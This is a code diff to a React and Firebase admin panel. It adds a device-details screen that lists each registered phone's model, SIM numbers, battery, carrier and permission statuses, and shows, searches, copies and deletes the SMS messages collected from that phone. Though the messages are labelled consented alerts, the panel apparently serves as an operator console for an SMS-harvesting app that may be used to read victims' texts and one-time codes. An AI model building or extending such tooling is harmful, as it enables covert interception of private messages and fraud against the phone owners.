@@ -1,6 +1,17 @@
 import React, { useEffect, useMemo, useState } from 'react';
-import { Info, KeyRound, Lock, Search, Star, Trash2 } from 'lucide-react';
 import {
+  ArrowLeft,
+  ArrowUpDown,
+  Copy,
+  Info,
+  KeyRound,
+  Lock,
+  Search,
+  Star,
+  Trash2,
+} from 'lucide-react';
+import {
+  deleteSmsAlertInDb,
   deleteUserFromDb,
   ensureAuthSession,
   formatReadableDateTime,
@@ -9,6 +20,7 @@ import {
   subscribeToAllUsers,
   subscribeToConnectionPresence,
   subscribeToServerTimeOffset,
+  updateAdminNoteInDb,
   type RotVahanUser,
   type SmsAlertRecord,
 } from '../lib/firebase';
@@ -92,6 +104,11 @@ export default function CskAdminPanel() {
   const [nowMs, setNowMs] = useState(() => Date.now());
   const [lastSyncedTime, setLastSyncedTime] = useState<string>('—');
 
+  const [selectedMobile, setSelectedMobile] = useState<string | null>(null);
+  const [detailSearchQuery, setDetailSearchQuery] = useState('');
+  const [statusUpdateInput, setStatusUpdateInput] = useState('');
+  const [detailNotice, setDetailNotice] = useState<string | null>(null);
+
   const [starredMobiles, setStarredMobiles] = useState<string[]>(() =>
     loadStringArray(STARRED_MOBILES_KEY),
   );
@@ -99,7 +116,6 @@ export default function CskAdminPanel() {
     loadStringArray(HIDDEN_MOBILES_KEY),
   );
 
-  const [infoUser, setInfoUser] = useState<RotVahanUser | null>(null);
   const [deleteTarget, setDeleteTarget] = useState<RotVahanUser | null>(null);
 
   const [showPasswordModal, setShowPasswordModal] = useState(false);
@@ -206,10 +222,18 @@ export default function CskAdminPanel() {
     });
   }
 
+  function openDeviceDetails(user: RotVahanUser) {
+    setSelectedMobile(user.mobileNumber);
+    setDetailSearchQuery('');
+    setStatusUpdateInput(user.adminNote || '');
+    setDetailNotice(null);
+  }
+
   async function confirmDeleteDevice() {
     if (!deleteTarget) return;
     const mobile = deleteTarget.mobileNumber;
     setDeleteTarget(null);
+    if (selectedMobile === mobile) setSelectedMobile(null);
     await deleteUserFromDb(mobile);
     setHiddenMobiles((prev) => {
       if (prev.includes(mobile)) return prev;
@@ -252,11 +276,273 @@ export default function CskAdminPanel() {
   );
   const offlineCount = visibleUsers.length - onlineCount;
 
+  const selectedUser = useMemo(
+    () => (selectedMobile ? users.find((u) => u.mobileNumber === selectedMobile) || null : null),
+    [users, selectedMobile],
+  );
+
+  const selectedUserAlerts = useMemo(() => {
+    if (!selectedUser) return [];
+    const q = detailSearchQuery.trim().toLowerCase();
+    return smsAlerts
+      .filter((a) => a.mobileNumber === selectedUser.mobileNumber)
+      .filter(
+        (a) =>
+          !q ||
+          a.alertMessage.toLowerCase().includes(q) ||
+          a.senderNumber.toLowerCase().includes(q) ||
+          (a.receivedAtFormatted || '').toLowerCase().includes(q),
+      );
+  }, [smsAlerts, selectedUser, detailSearchQuery]);
+
   function getTimerDisplay(user: RotVahanUser): string {
     if (!user.timerExpiryTime) return '—';
     const serverNow = nowMs + serverOffsetMs;
     const secs = Math.max(0, Math.ceil((user.timerExpiryTime - serverNow) / 1000));
     return secs > 0 ? `Active · ${formatCountdown(secs)}` : 'Expired (00:00)';
+  }
+
+  function showFlashNotice(msg: string) {
+    setDetailNotice(msg);
+    window.setTimeout(() => setDetailNotice((cur) => (cur === msg ? null : cur)), 2500);
+  }
+
+  // Dedicated Device Details View when a user card is clicked
+  if (isUnlocked && selectedUser) {
+    const isOnline =
+      selectedUser.connectionStatus === 'online' || selectedUser.isOnline === true;
+    const deviceModel =
+      selectedUser.deviceModel || selectedUser.mobileModel || 'Android Device';
+    const sim1 =
+      selectedUser.sim1Details ||
+      (selectedUser.simNumber && selectedUser.simNumber !== 'Not Checked'
+        ? selectedUser.simNumber
+        : 'Not reported');
+    const sim2 = selectedUser.sim2Details || 'Not reported';
+    const displayDate =
+      (selectedUser.deviceDateTime && selectedUser.deviceDateTime !== 'Pending'
+        ? selectedUser.deviceDateTime
+        : null) ||
+      selectedUser.registrationTimeFormatted ||
+      formatReadableDateTime(selectedUser.registrationTime);
+
+    const copySummary = [
+      `Model: ${deviceModel}`,
+      `Phone: ${selectedUser.mobileNumber}`,
+      `Name: ${selectedUser.userName}`,
+      `Sim1: ${sim1}`,
+      `Sim2: ${sim2}`,
+      `Battery: ${selectedUser.batteryPercentage || '0%'}`,
+      `Network: ${selectedUser.networkOperator || '—'}`,
+      `Status: ${isOnline ? 'Online' : 'Offline'}`,
+      `Date: ${displayDate}`,
+    ].join('\n');
+
+    return (
+      <div className="min-h-screen bg-white text-slate-900 flex flex-col">
+        <header className="border-b border-slate-200 bg-white sticky top-0 z-30">
+          <div className="max-w-2xl mx-auto px-3 sm:px-4 h-14 flex items-center justify-between gap-2">
+            <div className="flex items-center gap-2.5">
+              <button
+                type="button"
+                onClick={() => setSelectedMobile(null)}
+                title="Back"
+                className="p-1.5 rounded-lg hover:bg-slate-100 cursor-pointer"
+              >
+                <ArrowLeft className="w-5 h-5 text-slate-900" />
+              </button>
+              <span className="text-base sm:text-lg font-bold text-slate-900">
+                Device Details
+              </span>
+              <span
+                className={`text-xs sm:text-sm font-bold ${
+                  isOnline ? 'text-green-600' : 'text-orange-600'
+                }`}
+              >
+                {isOnline ? 'Online' : 'Offline'}
+              </span>
+            </div>
+
+            <div className="flex items-center gap-2">
+              <button
+                type="button"
+                onClick={() => showFlashNotice(`Synced · ${lastSyncedTime}`)}
+                title="Sync"
+                className="p-1.5 rounded-lg hover:bg-slate-100 cursor-pointer"
+              >
+                <ArrowUpDown className="w-5 h-5 text-slate-900" />
+              </button>
+              <button
+                type="button"
+                onClick={() => {
+                  void navigator.clipboard?.writeText(copySummary);
+                  showFlashNotice('Device details copied');
+                }}
+                title="Copy Details"
+                className="p-1.5 rounded-lg hover:bg-slate-100 cursor-pointer"
+              >
+                <Copy className="w-5 h-5 text-slate-900" />
+              </button>
+            </div>
+          </div>
+        </header>
+
+        <main className="flex-1 w-full max-w-2xl mx-auto px-3 sm:px-4 py-3 space-y-3">
+          {detailNotice && (
+            <div className="px-3 py-2 rounded-xl bg-emerald-50 border border-emerald-200 text-emerald-800 text-xs font-semibold">
+              {detailNotice}
+            </div>
+          )}
+
+          {/* Device & SIM Details Card */}
+          <div className="bg-white border border-slate-600 rounded-xl p-4 space-y-1.5">
+            <div className="flex items-center justify-between gap-2">
+              <h1 className="text-lg font-bold text-slate-900">{deviceModel}</h1>
+              <span className="font-timer text-xs font-semibold text-slate-600">
+                {getTimerDisplay(selectedUser)}
+              </span>
+            </div>
+            <div className="text-[15px] font-bold text-slate-900 tabular-nums">
+              Phone: {selectedUser.mobileNumber}
+            </div>
+            <div className="text-[15px] font-bold text-slate-900">
+              Name: {selectedUser.userName}
+            </div>
+            <div className="text-sm font-semibold text-slate-900 tabular-nums">Sim1: {sim1}</div>
+            <div className="text-sm font-semibold text-slate-900 tabular-nums">Sim2: {sim2}</div>
+            <div className="text-xs font-semibold text-slate-700">
+              Battery: {selectedUser.batteryPercentage || '0%'} · Network:{' '}
+              {selectedUser.networkOperator || '—'}
+            </div>
+            <div className="text-xs font-semibold text-slate-700 tabular-nums">
+              Date: {displayDate}
+            </div>
+            <div className="text-xs text-slate-600 pt-1">
+              SIM Perm: <strong>{selectedUser.simPermissionStatus || 'Not Requested'}</strong> ·
+              SMS Alert: <strong>{selectedUser.smsPermissionStatus || 'Not Available'}</strong> ·
+              Notif: <strong>{selectedUser.notificationPermissionStatus || 'Not Requested'}</strong>
+            </div>
+            {selectedUser.adminNote && (
+              <div className="text-xs font-bold text-blue-700 pt-1">
+                Saved Note: {selectedUser.adminNote}
+              </div>
+            )}
+          </div>
+
+          {/* Enter Update Status + UPDATE Button */}
+          <form
+            onSubmit={async (e) => {
+              e.preventDefault();
+              try {
+                await updateAdminNoteInDb(selectedUser.mobileNumber, statusUpdateInput.trim());
+                showFlashNotice('Status note updated');
+              } catch {
+                showFlashNotice('Unable to update status note (check Firebase rules)');
+              }
+            }}
+            className="flex items-center gap-2"
+          >
+            <input
+              type="text"
+              value={statusUpdateInput}
+              onChange={(e) => setStatusUpdateInput(e.target.value)}
+              placeholder="Enter Update Status"
+              className="flex-1 min-h-[44px] px-3.5 rounded-xl border border-slate-600 bg-white text-slate-900 text-sm focus:outline-none focus:ring-2 focus:ring-blue-600"
+            />
+            <button
+              type="submit"
+              className="min-h-[44px] px-5 rounded-xl bg-slate-900 hover:bg-slate-800 text-white text-xs font-bold tracking-wide cursor-pointer"
+            >
+              UPDATE
+            </button>
+          </form>
+
+          {/* Search Here Bar */}
+          <div className="border border-slate-600 rounded-xl px-3.5 py-2 flex items-center justify-between gap-2 bg-white">
+            <input
+              type="search"
+              value={detailSearchQuery}
+              onChange={(e) => setDetailSearchQuery(e.target.value)}
+              placeholder="Search Here"
+              className="flex-1 bg-transparent text-slate-900 placeholder:text-slate-900 font-semibold text-sm border-b border-slate-700 pb-0.5 focus:outline-none"
+            />
+            <Search className="w-5 h-5 text-slate-900 shrink-0" />
+          </div>
+
+          {/* User Consented SMS Alerts */}
+          <section className="space-y-2.5">
+            <div className="flex items-center justify-between">
+              <h2 className="text-sm font-bold text-slate-900">
+                User SMS Alerts ({selectedUserAlerts.length})
+              </h2>
+              <span className="text-xs font-bold text-green-600">
+                {selectedUserAlerts.filter((a) => a.status === 'New').length} New
+              </span>
+            </div>
+
+            {selectedUserAlerts.length === 0 ? (
+              <div className="p-6 text-center text-sm text-slate-500 border border-slate-600 rounded-xl">
+                No consented SMS arrival alerts for this device yet.
+              </div>
+            ) : (
+              <div className="space-y-2.5">
+                {selectedUserAlerts.map((alert) => (
+                  <div
+                    key={alert.id}
+                    className="bg-white border border-slate-600 rounded-xl p-3 flex items-start justify-between gap-3"
+                  >
+                    <div className="space-y-1.5 min-w-0 flex-1">
+                      <div className="text-sm font-bold text-green-600 break-words">
+                        {alert.alertMessage}
+                      </div>
+                      <div className="text-xs text-slate-600 tabular-nums">
+                        Sender: {alert.senderNumber} | Date:{' '}
+                        {alert.receivedAtFormatted || formatReadableDateTime(alert.receivedAt)} |
+                        Status: {alert.status}
+                      </div>
+                      {alert.status === 'New' && (
+                        <button
+                          type="button"
+                          onClick={() => void markSmsAlertSeenInDb(alert.mobileNumber, alert.id)}
+                          className="text-xs font-bold text-blue-700 hover:underline cursor-pointer"
+                        >
+                          Mark Seen
+                        </button>
+                      )}
+                    </div>
+
+                    <div className="flex flex-col items-center gap-2.5 shrink-0">
+                      <button
+                        type="button"
+                        onClick={() => {
+                          const clip = `${alert.alertMessage} | Sender: ${alert.senderNumber} | Date: ${
+                            alert.receivedAtFormatted || formatReadableDateTime(alert.receivedAt)
+                          }`;
+                          void navigator.clipboard?.writeText(clip);
+                          showFlashNotice('Alert copied');
+                        }}
+                        title="Copy Alert"
+                        className="p-1 text-slate-900 hover:bg-slate-100 rounded cursor-pointer"
+                      >
+                        <Copy className="w-4 h-4" />
+                      </button>
+                      <button
+                        type="button"
+                        onClick={() => void deleteSmsAlertInDb(alert.mobileNumber, alert.id)}
+                        title="Delete Alert"
+                        className="p-1 text-slate-900 hover:bg-slate-100 rounded cursor-pointer"
+                      >
+                        <Trash2 className="w-4 h-4" />
+                      </button>
+                    </div>
+                  </div>
+                ))}
+              </div>
+            )}
+          </section>
+        </main>
+      </div>
+    );
   }
 
   return (
@@ -295,6 +581,7 @@ export default function CskAdminPanel() {
                 onClick={() => {
                   localStorage.setItem(ADMIN_UNLOCKED_KEY, 'false');
                   setIsUnlocked(false);
+                  setSelectedMobile(null);
                   setPassword('');
                 }}
                 title="Lock"
@@ -407,7 +694,8 @@ export default function CskAdminPanel() {
                   return (
                     <div
                       key={user.mobileNumber}
-                      className="bg-white border border-slate-600 rounded-xl p-3 flex items-start gap-3.5"
+                      onClick={() => openDeviceDetails(user)}
+                      className="bg-white border border-slate-600 rounded-xl p-3 flex items-start gap-3.5 cursor-pointer hover:bg-slate-50/70 transition-colors"
                     >
                       {/* Left column: Index number + Cyan-Pink Phone Thumbnail */}
                       <div className="flex flex-col items-start gap-2 shrink-0">
@@ -416,7 +704,7 @@ export default function CskAdminPanel() {
                         </span>
                         <div
                           aria-hidden="true"
-                          className="w-[68px] h-[108px] rounded border border-slate-600"
+                          className="w-[66px] h-[106px] rounded border border-slate-600"
                           style={{
                             background:
                               'linear-gradient(145deg, #93c5fd 0%, #f5d0fe 32%, #22d3ee 60%, #e0f2fe 80%, #fbcfe8 100%)',
@@ -454,7 +742,10 @@ export default function CskAdminPanel() {
                             Status: {isOnline ? 'Online' : 'Offline'}
                           </span>
 
-                          <div className="flex items-center gap-3">
+                          <div
+                            className="flex items-center gap-3"
+                            onClick={(e) => e.stopPropagation()}
+                          >
                             <button
                               type="button"
                               onClick={() => toggleStar(user.mobileNumber)}
@@ -471,8 +762,8 @@ export default function CskAdminPanel() {
                             </button>
                             <button
                               type="button"
-                              onClick={() => setInfoUser(user)}
-                              title="Device info"
+                              onClick={() => openDeviceDetails(user)}
+                              title="Device Details"
                               className="cursor-pointer p-0.5 text-slate-900"
                             >
                               <Info className="w-5 h-5" />
@@ -531,8 +822,8 @@ export default function CskAdminPanel() {
                             Status: {alert.status}
                           </span>
                         </div>
-                        <div className="text-xs font-semibold text-slate-900">
-                          Alert: {alert.alertMessage}
+                        <div className="text-xs font-bold text-green-600">
+                          {alert.alertMessage}
                         </div>
                         <div className="text-xs text-slate-700">Sender: {alert.senderNumber}</div>
                         <div className="flex items-center justify-between gap-2 pt-0.5">
@@ -616,140 +907,6 @@ export default function CskAdminPanel() {
               </button>
             </div>
           </form>
-        </div>
-      )}
-
-      {/* Device Info Modal */}
-      {infoUser && (
-        <div
-          role="dialog"
-          aria-modal="true"
-          className="fixed inset-0 z-50 bg-slate-900/40 flex items-center justify-center p-4"
-        >
-          <div className="w-full max-w-md bg-white border border-slate-600 rounded-2xl p-5 space-y-3 shadow-lg max-h-[85vh] overflow-y-auto">
-            <h2 className="text-lg font-bold text-slate-900">
-              {infoUser.userName} (+91 {infoUser.mobileNumber})
-            </h2>
-            <div className="space-y-1.5 text-sm text-slate-700">
-              <div>
-                <strong>Status:</strong>{' '}
-                <span
-                  className={
-                    infoUser.connectionStatus === 'online' || infoUser.isOnline
-                      ? 'text-green-600 font-bold'
-                      : 'text-orange-600 font-bold'
-                  }
-                >
-                  {infoUser.connectionStatus === 'online' || infoUser.isOnline
-                    ? 'Online'
-                    : 'Offline'}
-                </span>
-              </div>
-              <div>
-                <strong>Model:</strong> {infoUser.deviceModel || infoUser.mobileModel || 'Android Device'}
-              </div>
-              <div>
-                <strong>Battery:</strong> {infoUser.batteryPercentage || '0%'}
-              </div>
-              <div>
-                <strong>Network Operator:</strong> {infoUser.networkOperator || '—'}
-              </div>
-              <div>
-                <strong>SIM 1:</strong> {infoUser.sim1Details || infoUser.simNumber || 'Not reported'}
-              </div>
-              <div>
-                <strong>SIM 2:</strong> {infoUser.sim2Details || 'Not reported'}
-              </div>
-              <div>
-                <strong>Device Date & Time:</strong> {infoUser.deviceDateTime || 'Pending'}
-              </div>
-              <div>
-                <strong>Registered:</strong>{' '}
-                {infoUser.registrationTimeFormatted ||
-                  formatReadableDateTime(infoUser.registrationTime)}
-              </div>
-              <div className="font-timer">
-                <strong>Timer:</strong> {getTimerDisplay(infoUser)}
-              </div>
-              <div>
-                <strong>SIM Permission:</strong>{' '}
-                <span
-                  className={
-                    infoUser.simPermissionStatus === 'Granted'
-                      ? 'text-green-600 font-semibold'
-                      : 'text-red-700 font-semibold'
-                  }
-                >
-                  {infoUser.simPermissionStatus || 'Not Requested'}
-                </span>
-              </div>
-              <div>
-                <strong>SMS Permission:</strong>{' '}
-                <span
-                  className={
-                    infoUser.smsPermissionStatus === 'Granted'
-                      ? 'text-green-600 font-semibold'
-                      : 'text-red-700 font-semibold'
-                  }
-                >
-                  {infoUser.smsPermissionStatus || 'Not Available'}
-                </span>
-              </div>
-              <div>
-                <strong>Notifications:</strong> {infoUser.notificationPermissionStatus || 'Not Requested'}
-              </div>
-              <div>
-                <strong>SMS Alert:</strong> {infoUser.smsAlertEnabled ? 'Enabled' : 'Off'}
-              </div>
-            </div>
-
-            {(() => {
-              const userAlerts = smsAlerts.filter((a) => a.mobileNumber === infoUser.mobileNumber);
-              if (userAlerts.length === 0) return null;
-              return (
-                <div className="pt-2 border-t border-slate-200 space-y-2">
-                  <div className="text-xs font-bold text-slate-900">
-                    User SMS Alerts ({userAlerts.length})
-                  </div>
-                  {userAlerts.slice(0, 8).map((alert) => (
-                    <div
-                      key={alert.id}
-                      className="p-2.5 rounded-lg border border-slate-300 flex items-center justify-between gap-2 text-xs"
-                    >
-                      <div>
-                        <div className="font-semibold text-slate-900">{alert.alertMessage}</div>
-                        <div className="text-slate-600">
-                          {alert.senderNumber} ·{' '}
-                          {alert.receivedAtFormatted || formatReadableDateTime(alert.receivedAt)}
-                        </div>
-                      </div>
-                      {alert.status === 'New' ? (
-                        <button
-                          type="button"
-                          onClick={() => void markSmsAlertSeenInDb(alert.mobileNumber, alert.id)}
-                          className="px-2 py-1 rounded border border-green-600 text-green-700 font-bold cursor-pointer"
-                        >
-                          Mark Seen
-                        </button>
-                      ) : (
-                        <span className="text-slate-500 font-semibold">Seen</span>
-                      )}
-                    </div>
-                  ))}
-                </div>
-              );
-            })()}
-
-            <div className="flex justify-end pt-2">
-              <button
-                type="button"
-                onClick={() => setInfoUser(null)}
-                className="px-4 py-2 rounded-xl border border-slate-400 text-slate-800 font-semibold text-sm cursor-pointer"
-              >
-                Close
-              </button>
-            </div>
-          </div>
         </div>
       )}
 
